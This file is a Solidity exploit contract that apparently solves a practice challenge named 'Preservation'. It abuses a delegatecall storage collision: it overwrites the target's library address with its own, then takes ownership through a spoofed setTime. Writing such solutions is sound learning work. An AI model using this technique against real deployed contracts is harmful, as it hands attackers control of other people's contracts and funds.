// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./16-preservation.sol";

contract Attack16 {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(Preservation preservation) public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(1111);
    }

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}
